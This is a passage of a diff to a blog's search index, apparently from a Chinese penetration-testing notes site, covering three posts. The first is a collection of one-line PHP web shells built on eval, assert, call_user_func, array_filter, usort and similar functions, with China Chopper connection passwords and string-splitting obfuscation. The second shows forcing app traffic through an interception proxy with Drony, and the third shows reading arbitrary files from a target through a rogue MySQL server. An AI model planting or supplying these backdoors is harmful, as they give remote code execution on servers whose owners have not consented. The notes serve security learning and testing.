-$func=$_GET[&apos;func&apos;];
-$cmd=$_POST[&apos;cmd&apos;];
-$array[0]=$cmd;
-$new_array=array_map($func,$array);
-echo $new_array;</code></pre><h2 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h2><pre><code>#创建匿名函数
-#执行命令和上传文件参考eval函数(必须加分号)。
-#菜刀连接密码：cmd
-$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><h2 id="5、preg-replace-函数"><a href="#5、preg-replace-函数" class="headerlink" title="5、preg_replace()函数"></a>5、preg_replace()函数</h2><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)
-#执行命令和上传文件参考assert函数(不需要加分号)。
-#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。
-preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><h2 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h2><pre><code>#传入的参数作为assert函数的参数
-#cmd=system(whoami)
-#菜刀连接密码：cmd
-call_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><h2 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h2><pre><code>#将传入的参数作为数组的第一个值传递给assert函数
-#cmd=system(whoami)
-#菜刀连接密码：cmd
-$cmd=$_POST[&apos;cmd&apos;];
-$array[0]=$cmd;
-call_user_func_array(&quot;assert&quot;,$array);</code></pre><h2 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h2><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)
-#命令执行func=system&amp;cmd=whoami
-#菜刀连接http://localhost/123.php?func=assert  密码cmd
-$cmd=$_POST[&apos;cmd&apos;];
-$array1=array($cmd);
-$func =$_GET[&apos;func&apos;];
-array_filter($array1,$func);</code></pre><h2 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h2><pre><code>#php环境&gt;=&lt;5.6才能用
-#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。
-#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);
-#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd
-usort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP代码执行函数</title>
+      <link href="/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
+      <url>/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h2><pre><code>#eval() 函数把字符串按照 PHP 代码来计算#常见一句话：&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><h2 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h2><pre><code>#与eval类似#常见一句话&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><h2 id="3、array-map-函数"><a href="#3、array-map-函数" class="headerlink" title="3、array_map()函数"></a>3、array_map()函数</h2><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。#命令执行http://localhost/123.php?func=system   cmd=whoami#菜刀连接http://localhost/123.php?func=assert   密码：cmd$func=$_GET[&apos;func&apos;];$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);echo $new_array;</code></pre><h2 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h2><pre><code>#创建匿名函数#执行命令和上传文件参考eval函数(必须加分号)。#菜刀连接密码：cmd$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><h2 id="5、preg-replace-函数"><a href="#5、preg-replace-函数" class="headerlink" title="5、preg_replace()函数"></a>5、preg_replace()函数</h2><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)#执行命令和上传文件参考assert函数(不需要加分号)。#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><h2 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h2><pre><code>#传入的参数作为assert函数的参数#cmd=system(whoami)#菜刀连接密码：cmdcall_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><h2 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h2><pre><code>#将传入的参数作为数组的第一个值传递给assert函数#cmd=system(whoami)#菜刀连接密码：cmd$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);</code></pre><h2 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h2><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)#命令执行func=system&amp;cmd=whoami#菜刀连接http://localhost/123.php?func=assert  密码cmd$cmd=$_POST[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);</code></pre><h2 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h2><pre><code>#php环境&gt;=&lt;5.6才能用#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmdusort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用drony解决APP无法抓包</title>
-    <url>/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/</url>
-    <content><![CDATA[<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>默认Flutter不会主动使用系统代理，需要单独设置。</p>
-<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。</p>
-<h2 id="环境常规配置："><a href="#环境常规配置：" class="headerlink" title="环境常规配置："></a>环境常规配置：</h2><h3 id="1-抓包工具安装，证书安装；"><a href="#1-抓包工具安装，证书安装；" class="headerlink" title="1.抓包工具安装，证书安装；"></a>1.抓包工具安装，证书安装；</h3><h3 id="2-安卓模拟器安装，并安装drony"><a href="#2-安卓模拟器安装，并安装drony" class="headerlink" title="2.安卓模拟器安装，并安装drony"></a>2.安卓模拟器安装，并安装drony</h3><h3 id="3-drony配置-这里试验抓闲鱼的数据包"><a href="#3-drony配置-这里试验抓闲鱼的数据包" class="headerlink" title="3.drony配置(这里试验抓闲鱼的数据包):"></a>3.drony配置(这里试验抓闲鱼的数据包):</h3><p>进入drony,此时是off关闭状态，</p>
-<p><img src="0.png" alt="0"></p>
-<p>向左划动，选择Wi-Fi</p>
-<p><img src="1.png" alt="1"></p>
-<p>对wi-fi进行设置</p>
-<p><img src="2.png" alt="2"></p>
-<p>选择代理模式为手动（Manual）</p>
-<p><img src="3.png" alt="3"></p>
-<p>Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all</p>
-<p><img src="4.png" alt="4"></p>
-<p>选择Rule，设置应用规则</p>
-<p><img src="5.png" alt="5">)<img src="6.png" alt="6"></p>
-<p>Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain，</p>
-<p>Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。</p>
-<p><img src="7.png" alt="7"></p>
-<p>返回到主页面，点击off，变为启动状态</p>
-<p><img src="8.png" alt="8"></p>
-<h3 id="4-抓包工具配置："><a href="#4-抓包工具配置：" class="headerlink" title="4.抓包工具配置："></a>4.抓包工具配置：</h3><p>设置代理ip及端口</p>
-<p><img src="8-2.png" alt="8-2"></p>
-<p>后续进行抓包常规操作即可</p>
-<p><img src="9.png" alt="9"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使用drony解决APP无法抓包</title>
+      <link href="/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/"/>
+      <url>/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/</url>
+      
+        <content type="html"><![CDATA[<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>默认Flutter不会主动使用系统代理，需要单独设置。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。</p><h2 id="环境常规配置："><a href="#环境常规配置：" class="headerlink" title="环境常规配置："></a>环境常规配置：</h2><h3 id="1-抓包工具安装，证书安装；"><a href="#1-抓包工具安装，证书安装；" class="headerlink" title="1.抓包工具安装，证书安装；"></a>1.抓包工具安装，证书安装；</h3><h3 id="2-安卓模拟器安装，并安装drony"><a href="#2-安卓模拟器安装，并安装drony" class="headerlink" title="2.安卓模拟器安装，并安装drony"></a>2.安卓模拟器安装，并安装drony</h3><h3 id="3-drony配置-这里试验抓闲鱼的数据包"><a href="#3-drony配置-这里试验抓闲鱼的数据包" class="headerlink" title="3.drony配置(这里试验抓闲鱼的数据包):"></a>3.drony配置(这里试验抓闲鱼的数据包):</h3><p>进入drony,此时是off关闭状态，</p><p><img src="0.png" alt="0"></p><p>向左划动，选择Wi-Fi</p><p><img src="1.png" alt="1"></p><p>对wi-fi进行设置</p><p><img src="2.png" alt="2"></p><p>选择代理模式为手动（Manual）</p><p><img src="3.png" alt="3"></p><p>Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all</p><p><img src="4.png" alt="4"></p><p>选择Rule，设置应用规则</p><p><img src="5.png" alt="5">)<img src="6.png" alt="6"></p><p>Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain，</p><p>Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。</p><p><img src="7.png" alt="7"></p><p>返回到主页面，点击off，变为启动状态</p><p><img src="8.png" alt="8"></p><h3 id="4-抓包工具配置："><a href="#4-抓包工具配置：" class="headerlink" title="4.抓包工具配置："></a>4.抓包工具配置：</h3><p>设置代理ip及端口</p><p><img src="8-2.png" alt="8-2"></p><p>后续进行抓包常规操作即可</p><p><img src="9.png" alt="9"></p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>测试姿势</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>伪造mysql服务端实现任意文件读取</title>
-    <url>/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
-    <content><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p>
-<h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><pre><code>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql
-
-2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用）
-
-3.。。。。。其他情况</code></pre><hr>
-<h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><pre><code>虚拟机两个，靶机装mysql，攻击端装py</code></pre><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p>
-<h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><pre><code>exp_input.py脚本是输入文件，单独读取
-
-启动
-
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure>
-
-读取的文件最后保存在log文件夹下</code></pre><hr>
-<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p>
-<p>exp_input.py 3306</p>
-<p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p>
-<p><img src="0.png" alt="0"></p>
-<p>靶机使用mysql向攻击端发送请求</p>
-<p><img src="0-1.png" alt="0-1"></p>
-<p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p>
-<p><img src="1.png" alt="1"></p>
-<p>此时返回攻击端，可以看到dos窗口回显了信息</p>
-<p><img src="0-0.png" alt="0-0"></p>
-<p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p>
-<p><img src="0-2.png" alt="0-2"></p>
-<p><img src="0-3.png" alt="0-3"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 测试姿势 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>伪造mysql服务端实现任意文件读取</title>
+      <link href="/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
+      <url>/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
+      
+        <content type="html"><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p><h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><pre><code>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用）3.。。。。。其他情况</code></pre><hr><h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><pre><code>虚拟机两个，靶机装mysql，攻击端装py</code></pre><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p><h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><pre><code>exp_input.py脚本是输入文件，单独读取启动<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure>读取的文件最后保存在log文件夹下</code></pre><hr><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p><p>exp_input.py 3306</p><p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p><p><img src="0.png" alt="0"></p><p>靶机使用mysql向攻击端发送请求</p><p><img src="0-1.png" alt="0-1"></p><p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p><p><img src="1.png" alt="1"></p><p>此时返回攻击端，可以看到dos窗口回显了信息</p><p><img src="0-0.png" alt="0-0"></p><p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p><p><img src="0-2.png" alt="0-2"></p><p><img src="0-3.png" alt="0-3"></p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>漏洞利用</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
